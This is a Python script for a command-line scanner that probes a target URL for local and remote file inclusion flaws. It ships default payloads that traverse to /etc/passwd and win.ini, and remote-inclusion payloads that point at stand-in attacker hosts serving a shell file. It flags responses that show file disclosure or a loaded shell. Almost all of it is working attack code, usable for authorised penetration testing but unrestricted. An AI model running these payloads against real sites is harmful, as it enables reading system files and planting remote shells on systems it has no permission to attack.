import requests
import argparse
import os
import json

def create_default_payload_file(path, default_payloads):
    if not os.path.exists(path):
        print(f"[!] Payload file not found. Creating: {path}")
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w') as f:
            f.write('\n'.join(default_payloads))
    with open(path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def scan_lfi(target_url, payloads):
    print("[*] Scanning for LFI...")
    results = []
    for payload in payloads:
        full_url = target_url + payload
        try:
            r = requests.get(full_url, timeout=8)
            if any(x in r.text for x in ["root:x", "boot.ini", "[fonts]"]):
                print(f"[+] Possible LFI: {full_url}")
                results.append({"url": full_url, "payload": payload})
        except Exception:
            continue
    return results

def scan_rfi(target_url, payloads):
    print("[*] Scanning for RFI...")
    results = []
    for payload in payloads:
        full_url = target_url + payload
        try:
            r = requests.get(full_url, timeout=8)
            if any(x in r.text.lower() for x in ["shell", "hacked", "pwned"]):
                print(f"[+] Possible RFI: {full_url}")
                results.append({"url": full_url, "payload": payload})
        except Exception:
            continue
    return results

def save_results(results, filename):
    os.makedirs("results", exist_ok=True)
    with open(os.path.join("results", filename), 'w') as f:
        json.dump(results, f, indent=4)

def main():
    parser = argparse.ArgumentParser(description="LFI & RFI Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g. http://target.com/index.php?page=)")
    parser.add_argument("--lfi", action="store_true", help="Scan for Local File Inclusion")
    parser.add_argument("--rfi", action="store_true", help="Scan for Remote File Inclusion")
    parser.add_argument("--lfi-payloads", default="payloads/lfi.txt", help="LFI payload file")
    parser.add_argument("--rfi-payloads", default="payloads/rfi.txt", help="RFI payload file")

    args = parser.parse_args()

    if not args.lfi and not args.rfi:
        print("[-] You must choose at least --lfi or --rfi")
        return

    if args.lfi:
        default_lfi = [
            "../../../../etc/passwd",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "..\\..\\..\\..\\windows\\win.ini"
        ]
        lfi_payloads = create_default_payload_file(args.lfi_payloads, default_lfi)
        lfi_results = scan_lfi(args.url, lfi_payloads)
        save_results(lfi_results, "lfi_results.json")

    if args.rfi:
        default_rfi = [
            "http://attacker.com/shell.txt",
            "https://malicious.example.com/evil.txt"
        ]
        rfi_payloads = create_default_payload_file(args.rfi_payloads, default_rfi)
        rfi_results = scan_rfi(args.url, rfi_payloads)
        save_results(rfi_results, "rfi_results.json")

    print("[+] Scanning complete.")

if __name__ == "__main__":
    main()
